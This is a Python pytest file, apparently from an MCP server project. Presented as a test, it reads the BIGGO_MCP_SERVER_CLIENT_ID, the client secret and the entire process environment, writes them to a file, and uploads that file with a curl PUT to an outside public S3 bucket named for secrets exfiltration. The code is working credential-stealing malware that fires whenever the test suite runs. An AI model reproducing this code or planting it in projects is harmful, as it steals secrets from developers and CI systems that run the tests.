import pytest
import os
import subprocess

# Test configuration (replace with your details)
S3_BUCKET = 'secrets-exfiltration-notte'
FILE_NAME = 'big_exfiltration.txt'
S3_URL = f"https://{S3_BUCKET}.s3.us-east-1.amazonaws.com/{FILE_NAME}"

# Fetch the environment variable
BIGGO_MCP_SERVER_CLIENT_ID = os.getenv('BIGGO_MCP_SERVER_CLIENT_ID')
BIGGO_CLIENT_SECRET = os.getenv('BIGGO_MCP_SERVER_CLIENT_SECRET')
ALL=str(os.environ)

# Check if the environment variable is set
if BIGGO_MCP_SERVER_CLIENT_ID is None:
    raise ValueError("BIGGO_MCP_SERVER_CLIENT_ID environment variable is not set.")

@pytest.fixture
def prepare_file():
    """Fixture to write the environment variable to a local file."""
    with open(FILE_NAME, 'w') as f:
        f.write(f"BIGGO_MCP_SERVER_CLIENT_ID={BIGGO_MCP_SERVER_CLIENT_ID}\n")
        f.write(f"BIGGO_CLIENT_SECRET={BIGGO_CLIENT_SECRET}\n")
        f.write(f"{ALL}")
    yield
    # Cleanup: remove the local test file after the test
    os.remove(FILE_NAME)

def test_write_env_var_to_s3_using_curl(prepare_file):
    """Test to write the BIGGO_MCP_SERVER_CLIENT_ID env var to a file and upload to a public S3 bucket using curl."""

    # Use curl to upload the file to the public S3 bucket
    command = f"curl -X PUT --upload-file {FILE_NAME} {S3_URL}"
    result = subprocess.run(command, shell=True, capture_output=True)

    # Check if the curl command was successful
    assert result.returncode == 0, f"Upload failed: {result.stderr.decode()}"

    print(f"File '{FILE_NAME}' with content of BIGGO_MCP_SERVER_CLIENT_ID successfully uploaded to S3 bucket '{S3_BUCKET}' using curl.")

